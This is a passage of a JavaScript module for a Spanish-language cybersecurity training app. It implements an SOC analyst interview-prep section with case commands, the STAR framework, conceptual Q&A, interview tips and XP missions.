            '  CASOS DE ENTREVISTA DISPONIBLES',
            '═══════════════════════════════════════════════════════',
            '',
            'Estos son casos REALES usados en entrevistas SOC/Cybersec 2026',
            '(Fuentes: TryHackMe SOC Guide, KORE1, LetsDefend, MS IR Playbooks)',
            ''
        ]
        Object.entries(env.cases).forEach(([key, c]) => {
            const status = c.completed ? '✅ Completado' : '⬜ Pendiente'
            out.push(`  ${key.padEnd(12)} [${c.difficulty}] ${c.title}  ${status}`)
        })
        out.push('', `Score actual: ${env.score} pts`, '',
            'Para empezar un caso: start <nombre>',
            'Ejemplo: start phishing',
            '',
            'Otros comandos:',
            '  star          - Aprende framework STAR para preguntas behavioral',
            '  questions     - Top 10 preguntas conceptuales con respuestas',
            '  tips          - Tips finales para el día de la entrevista')
        return { out }
    },

    'start': (args, env) => {
        const caseName = args[0]
        if (!caseName || !CASES[caseName]) {
            return { out: [`Caso '${caseName || ''}' no existe.`, 'Usa: cases para ver disponibles.'] }
        }
        const newEnv = structuredClone(env)
        newEnv.current_case = { name: caseName, question_idx: 0 }
        return { out: CASES[caseName].intro, env: newEnv, events: [{ t: 'case_started', case: caseName }] }
    },

    'answer': (args, env) => {
        if (!env.current_case) return { out: ['No hay caso activo. Usa: start <nombre>'] }
        const answer = parseInt(args[0])
        if (!answer || answer < 1 || answer > 4) return { out: ['Respuesta inválida. Usa: answer 1, answer 2, answer 3, o answer 4'] }

        const c = CASES[env.current_case.name]
        const q = c.questions[env.current_case.question_idx]
        const isCorrect = answer === q.correct

        const out = []
        if (isCorrect) {
            out.push(...q.feedback_correct)
        } else {
            out.push(...(q.feedback_wrong[answer] || ['❌ Incorrecto.']))
            out.push('', `Respuesta correcta era: ${q.correct}`)
        }

        const newEnv = structuredClone(env)
        if (isCorrect) newEnv.score += 50

        // Avanzar pregunta o terminar caso
        if (env.current_case.question_idx < c.questions.length - 1) {
            newEnv.current_case.question_idx++
            out.push('')
            out.push(...(c.questions[newEnv.current_case.question_idx].prompt || ['(siguiente pregunta cargada)']))
        } else {
            // Caso completado
            out.push('')
            out.push(...c.final)
            newEnv.cases[env.current_case.name].completed = true
            if (!newEnv.cases_completed.includes(env.current_case.name)) {
                newEnv.cases_completed.push(env.current_case.name)
            }
            if (isCorrect) newEnv.cases_passed.push(env.current_case.name)
            newEnv.current_case = null
        }

        return { out, env: newEnv, events: [{ t: 'case_answered', correct: isCorrect }] }
    },

    'star': () => ({
        out: [
            '═══════════════════════════════════════════════════════',
            '  STAR FRAMEWORK - Para preguntas behavioral',
            '═══════════════════════════════════════════════════════',
            '',
            'Usado en TODA entrevista cuando preguntan:',
            '  "Tell me about a time when..."',
            '  "Describe an incident you investigated..."',
            '  "Walk me through a challenging case..."',
            '',
            '─── FORMATO STAR ─────────────────────────────────────',
            '',
            'S - SITUATION (15-20 segundos)',
            '    Contexto: ¿dónde, cuándo, qué pasaba?',
            '    Ejemplo: "En mi homelab con Wazuh, una de mis VMs disparó alertas"',
            '',
            'T - TASK (10-15 segundos)',
            '    Qué necesitabas resolver / tu responsabilidad',
            '    Ejemplo: "Necesitaba determinar si era ataque real o FP"',
            '',
            'A - ACTION (40-50 segundos) ← LA MÁS IMPORTANTE',
            '    Pasos ESPECÍFICOS que tomaste. Tools, comandos, decisiones.',
            '    Ejemplo: "Primero verifiqué los logs en Splunk con query X,',
            '             luego correlacioné con eventos de auth, después...."',
            '',
            'R - RESULT (15-20 segundos)',
            '    Outcome + qué aprendiste',
            '    Ejemplo: "Confirmé brute force desde Tor. Implementé regla',
            '             nueva en Wazuh. Aprendí a correlacionar entre fuentes."',
            '',
            '─── EJEMPLOS DE USO ──────────────────────────────────',
            '',
            'Pregunta: "Tell me about a real incident you investigated"',
            '',
            'Mala respuesta: "Una vez vi una alerta de phishing y la cerré."',
            '  ↳ Sin estructura, sin detalle, sin aprendizaje',
            '',
            'Buena respuesta (STAR):',
            '"(S) En mi lab personal con TryHackMe SOC Sim, recibí una alerta de',
            'phishing detectado por mi SIEM apuntando a 5 usuarios. (T) Mi tarea',
            'era determinar el alcance y contener. (A) Primero verifiqué headers',
            'del email para confirmar spoofing — encontré SPF fail. Pivotí a logs',
            'de email y encontré que 2 usuarios clickearon. En auth logs vi que',
            'uno logged in desde IP rara después del click. Aislé esa cuenta,',
            'reseteé password, revoqué sesiones. (R) Contuve en 15 min. Aprendí',
            'que la primera prioridad es siempre validar SPF/DKIM antes de actuar."',
            '',
            'Tip: Tus "incidentes" pueden ser de TryHackMe, HackTheBox, o homelab.',
            'Sé honesto: "In my home lab simulation..." es VÁLIDO en entry-level.'
        ]
    }),

    'questions': () => ({
        out: [
            '═══════════════════════════════════════════════════════',
            '  TOP 10 PREGUNTAS CONCEPTUALES + RESPUESTAS',
            '═══════════════════════════════════════════════════════',
            '',
            '1. ¿Qué es la CIA Triad?',
            '   → Confidentiality (cifrado), Integrity (hashes/firmas),',
            '     Availability (uptime, DDoS protection).',
            '',
            '2. Diferencia entre IDS e IPS?',
            '   → IDS: Detecta y alerta (passive). IPS: Detecta y BLOQUEA (active).',
            '   → Snort puede ser ambos; Suricata también.',
            '',
            '3. ¿Qué es Defense in Depth?',
            '   → Múltiples capas: firewall + IDS + EDR + SIEM + user training.',
            '     Si una falla, las otras protegen.',
            '',
            '4. Diferencia entre symmetric y asymmetric encryption?',
            '   → Simétrica: una llave (AES). Rápida pero shared secret.',
            '   → Asimétrica: par pública/privada (RSA). Lenta pero PKI.',
            '   → HTTPS usa AMBAS: RSA para handshake, AES para data.',
            '',
            '5. ¿Qué es Zero Trust?',
            '   → "Never trust, always verify". No hay red interna confiable.',
            '     Cada request se autentica/autoriza independiente de origen.',
            '',
            '6. SIEM vs SOAR?',
            '   → SIEM: agrega logs, correlaciona, alerta (Splunk, Sentinel).',
            '   → SOAR: automatiza respuesta (playbooks, integraciones).',
            '   → Modernos SOCs usan ambos.',
            '',
            '7. ¿Qué es MITRE ATT&CK?',
            '   → Knowledge base de TTPs (Tactics, Techniques, Procedures)',
            '     que usan atacantes reales. Te ayuda a mapear ataques y',
            '     hablar el mismo lenguaje que threat intel.',
            '',
            '8. Tipos comunes de malware?',
            '   → Virus (se replica), Worm (auto-propaga), Trojan (oculto),',
            '     Ransomware (cifra), RAT (control remoto), Rootkit (oculta),',
            '     Spyware (espía), Keylogger (registra teclas).',
            '',
            '9. ¿Qué hace un firewall?',
            '   → Filtra tráfico por reglas (allow/deny). Capas: L3/L4 (IP/port)',
            '     o L7 (app-aware, NGFW como Palo Alto).',
            '   → Stateful (rastrea conexiones) > stateless.',
            '',
            '10. Fases del Incident Response (NIST)?',
            '    → Preparation → Detection → Analysis → Containment →',
            '      Eradication → Recovery → Lessons Learned',
            '    → NUNCA omitas Lessons Learned en una respuesta.',
            '',
            '─── BONUS: Preguntas trampa comunes ──────────────────',
            '',
            '• "¿Cómo te mantienes actualizado?"',
            '  → Krebs, Bleeping Computer, /r/netsec, Twitter infosec,',
            '    podcasts (Darknet Diaries, Risky Business).',
            '',
            '• "¿Por qué cybersecurity y no otra cosa?"',
            '  → Sé honesto y específico. Tu historia con CyberLab, THM, etc.',
            '',
            '• "¿Dónde te ves en 5 años?"',
            '  → SOC L1 → L2/L3 → Detection Engineer o Threat Hunter',
            '    o → Pentester → Senior Pentester'
        ]
    }),

    'tips': () => ({
        out: [
            '═══════════════════════════════════════════════════════',
            '  TIPS FINALES PARA EL DÍA DE LA ENTREVISTA',
            '═══════════════════════════════════════════════════════',
            '',
            '─── ANTES ────────────────────────────────────────────',
            '',
            '• Investiga la empresa: ¿qué stack usan? Splunk? Sentinel?',
            '• Lee sus posts de seguridad / breach públicos / blog técnico',
            '• Prepara 3 preguntas para ellos al final (CRÍTICO)',
            '• Practica el caso "tell me about yourself" en 60 segundos',
            '• Stack technical refresh: top 5 OWASP, top 10 MITRE ATT&CK',
            '',
            '─── DURANTE LA ENTREVISTA ────────────────────────────',
            '',
            '1. PIENSA EN VOZ ALTA',
            '   ✓ "Mi primera consideración sería verificar X..."',
            '   ✗ silencio largo + respuesta perfecta',
            '   El hiring manager quiere ver TU PROCESO de pensamiento.',
            '',
            '2. CUANDO NO SEPAS ALGO',
            '   ✓ "No lo sé exactamente, pero mi enfoque sería investigarlo así..."',
            '   ✗ inventar o quedarse callado',
            '   Mostrar METODOLOGÍA > saber todo.',
            '',
            '3. USA TERMINOLOGÍA ESPECÍFICA',
            '   ✓ "MITRE T1566.001 Phishing, SPF/DKIM/DMARC, indicators of',
            '      compromise (IoCs), TTPs, kill chain..."',
            '   ✗ "ese ataque de phishing..."',
            '',
            '4. CITA TUS PROYECTOS',
            '   ✓ "En mi homelab con Wazuh detecté X..."',
            '   ✓ "En mi writeup de HackTheBox Lame aprendí..."',
            '   ✓ "En mi CyberLab construí simulación de AD donde..."',
            '',
            '5. SÉ HONESTO SOBRE NIVEL',
            '   ✓ "Mi experiencia con Splunk es de homelab, no producción"',
            '   ✗ "Sí, soy experto en Splunk" (mentira detectable)',
            '',
            '─── PREGUNTAS PARA HACERLES AL FINAL ─────────────────',
            '',
            '• "¿Cómo es un día típico para un L1 aquí?"',
            '• "¿Qué stack usan en su SOC? ¿Splunk, Sentinel, QRadar?"',
            '• "¿Cuál es el path de crecimiento de L1 a L2 aquí?"',
            '• "¿Cómo manejan training continuo y certificaciones?"',
            '• "¿Cuántos analistas tiene el SOC? ¿24/7 coverage?"',
            '',
            '─── RED FLAGS DE LA ENTREVISTA (huye) ────────────────',
            '',
            '⚠ Mucho overtime sin compensación',
            '⚠ No tienen procesos definidos (caos)',
            '⚠ "Aquí vas a aprender todo" sin estructura',
            '⚠ Quieren que hagas 20 cosas simultáneas (no es un rol claro)',
            '⚠ No quieren responder sobre salario hasta el final',
            '',
            '─── DESPUÉS ──────────────────────────────────────────',
            '',
            '• Email de agradecimiento dentro de 24 horas (siempre)',
            '• Conecta en LinkedIn con interviewers',
            '• Si te rechazan, pide feedback (oro puro para mejorar)',
            '• Si no responden en 1 semana, follow-up educado'
        ]
    }),

    'help': () => ({
        out: [
            'Comandos del módulo Interview Prep:',
            '',
            '  cases               - Ver todos los casos disponibles',
            '  start <caso>        - Empezar un caso (ej: start phishing)',
            '  answer <1-4>        - Responder a pregunta del caso activo',
            '  star                - Aprender framework STAR',
            '  questions           - Top 10 preguntas conceptuales',
            '  tips                - Tips para el día de la entrevista',
            '  help                - Esta ayuda',
            '',
            'Recomendación: empieza con "cases" y completa los 6 en orden.'
        ]
    })
}

const missions = [
    {
        id: 'int1', title: 'Caso Phishing Investigation', xp: 120,
        brief: 'El caso #1 más preguntado en entrevistas SOC. Práctica el proceso: validar → contener → erradicar → documentar. Si dominas esto, dominas SOC.',
        obj: 'Completa el caso de Phishing.',
        hint: 'cases\nstart phishing',
        check: ev => ev.some(e => e.t === 'case_answered' && e.correct) && ev.filter(e => e.t === 'case_started' && e.case === 'phishing').length > 0
    },
    {
        id: 'int2', title: 'Caso Brute Force + Account Takeover', xp: 130,
        brief: 'Cómo responder a credenciales comprometidas. Pregunta clásica con CFO / executive como target = BEC (Business Email Compromise).',
        obj: 'Completa el caso de Brute Force.',
        hint: 'start bruteforce',
        check: ev => ev.filter(e => e.t === 'case_started' && e.case === 'bruteforce').length > 0
    },
    {
        id: 'int3', title: 'Caso PowerShell Malware', xp: 150,
        brief: 'Patrón clásico: WINWORD spawns PowerShell encoded → C2. Aquí muestras conocimiento de MITRE ATT&CK y forensics.',
        obj: 'Completa el caso de Malware/PowerShell.',
        hint: 'start malware',
        check: ev => ev.filter(e => e.t === 'case_started' && e.case === 'malware').length > 0
    },
    {
        id: 'int4', title: 'Caso Data Exfiltration', xp: 130,
        brief: 'Insider threat por empleado saliente. Aquí muestras maturity: coordinación con HR/Legal, preservación de evidencia, no confrontación.',
        obj: 'Completa el caso de Exfiltration.',
        hint: 'start exfil',
        check: ev => ev.filter(e => e.t === 'case_started' && e.case === 'exfil').length > 0
    },
    {
        id: 'int5', title: 'Caso SQL Injection', xp: 100,
        brief: 'Reconocer el patrón de SQLi en logs y responder. Containment inmediato + investigación de exfil + coordinación con dev.',
        obj: 'Completa el caso de SQL Injection.',
        hint: 'start webattack',
        check: ev => ev.filter(e => e.t === 'case_started' && e.case === 'webattack').length > 0
    },
    {
        id: 'int6', title: 'Caso Insider Privilege Abuse', xp: 150,
        brief: 'Admin abusando privilegios. El caso más sensible: requiere protocolo formal (CISO, HR, Legal) y preservación impecable de evidencia.',
        obj: 'Completa el caso de Insider Threat.',
        hint: 'start insider',
        check: ev => ev.filter(e => e.t === 'case_started' && e.case === 'insider').length > 0
    },
    {
        id: 'int7', title: 'Domina el framework STAR', xp: 70,
        brief: 'STAR = Situation, Task, Action, Result. Usado en 90% de preguntas behavioral. Sin esto, tus historias parecen amateur.',
        obj: 'Estudia el framework STAR.',
        hint: 'star',
        check: ev => ev.some(e => e.t === 'case_started') // proxy: explorar el módulo
    }
]

export default {
    id: 'interview',
    icon: '🎤',
    name: 'Interview Prep',
    sub: 'Casos reales 2026 + STAR + preguntas técnicas',
    initEnv,
    prompt: () => 'interview-prep>',
    intro: [
        '═══════════════════════════════════════════════════════════',
        '  🎤 MÓDULO: INTERVIEW PREP - CASOS REALES 2026',
        '═══════════════════════════════════════════════════════════',
        '',
        'Basado en investigación de fuentes reales (TryHackMe SOC Guide,',
        'KORE1 hiring managers, LetsDefend, Microsoft IR Playbooks, SIEM',
        'XPERT, KnowledgeHut). Estos son LOS casos que más usan en',
        'entrevistas de SOC Analyst y Junior Pentester en 2026.',
        '',
        '📋 6 CASOS prácticos (escenario → preguntas → feedback de hiring manager)',
        '⭐ FRAMEWORK STAR para preguntas behavioral',
        '📚 10 preguntas conceptuales top con respuestas',
        '💡 Tips para el día de la entrevista',
        '',
        'Empieza con: cases'
    ],
    commands,
    missions
}